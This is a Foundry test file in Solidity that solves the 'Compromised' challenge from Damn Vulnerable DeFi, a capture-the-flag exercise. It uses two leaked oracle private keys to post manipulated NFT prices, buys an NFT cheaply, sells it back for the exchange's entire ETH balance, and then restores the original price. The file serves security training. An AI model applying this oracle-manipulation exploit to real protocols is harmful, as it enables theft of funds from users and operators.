// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/Test.sol";
import {
    Exchange,
    TrustfulOracle,
    DamnValuableNFT,
    TrustfulOracleInitializer
} from "@contracts/CTF/Damn-Vulnerable-DeFi/07.Compromised.sol";

/*
    forge test --match-path foundry/test/CTF/Damn-Vulnerable-DeFi/07.Compromised.t.sol -vvvvv
*/

contract Challenge_7_Compromised_Test is Test {
    // hacking attack address
    address private deployer = address(1);
    address private feeRecipient = address(2);
    address private player = address(2333);

    uint256 private constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 private constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
    uint256 private constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 private constant INITIAL_NFT_PRICE = 999 ether;

    TrustfulOracle private oracle;
    Exchange private exchange;
    DamnValuableNFT private nftToken;

    address[] private sources = [
        0xA73209FB1a42495120166736362A1DfA9F95A105,
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15,
        0x81A5D6E50C214044bE44cA0CB057fe119097850c
    ];
    address private oracle1;
    address private oracle2;

    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, type(uint256).max);
        _before();
        vm.stopPrank();
    }

    function _before() public {
        /* SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        string[] memory symbols = new string[](3);
        uint256[] memory initialPrices = new uint256[](3);

        for (uint256 i = 0; i < 3; i++) {
            symbols[i] = "DVNFT";
            initialPrices[i] = INITIAL_NFT_PRICE;
        }

        TrustfulOracleInitializer initializer = new TrustfulOracleInitializer(sources, symbols, initialPrices);
        oracle = TrustfulOracle(initializer.oracle());
        exchange = new Exchange{ value: EXCHANGE_INITIAL_ETH_BALANCE }(address(oracle));
        nftToken = DamnValuableNFT(exchange.token());
    }

    function test_Exploit() public {
        /* START CODE YOUR SOLUTION HERE */
        // 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
        oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        // 0x81A5D6E50C214044bE44cA0CB057fe119097850c
        oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);

        _postPrice(0.0001 ether);

        vm.startPrank(player);
        uint256 id = exchange.buyOne{ value: 0.0001 ether }();
        vm.stopPrank();

        uint256 exchangeBalance = address(exchange).balance;
        _postPrice(exchangeBalance);

        vm.startPrank(player);
        nftToken.approve(address(exchange), id);
        exchange.sellOne(id);
        vm.stopPrank();

        _postPrice(INITIAL_NFT_PRICE);

        /* END CODE YOUR SOLUTION */
        _after();
    }

    function _after() public {
        /* SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        vm.startPrank(deployer);
        assertEq(address(exchange).balance, 0);
        assertGt(address(player).balance, EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(nftToken.balanceOf(player), 0);
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
        vm.stopPrank();
    }

    function _postPrice(uint256 price) internal {
        vm.startPrank(oracle1);
        oracle.postPrice("DVNFT", price);
        vm.stopPrank();
        vm.startPrank(oracle2);
        oracle.postPrice("DVNFT", price);
        vm.stopPrank();
    }
}
